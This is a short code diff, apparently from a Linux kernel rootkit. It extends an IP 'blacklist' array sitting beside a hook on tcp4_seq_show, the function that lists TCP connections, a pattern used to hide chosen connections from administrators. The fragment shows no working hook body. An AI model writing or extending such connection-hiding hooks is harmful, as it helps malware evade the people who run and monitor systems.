@@ -11,7 +11,7 @@ static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 
 
 static __be32 blacklist_ips[] = {
-    0, 0, 0, 0
+    0, 0, 0, 0, 0
 };
 
 static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
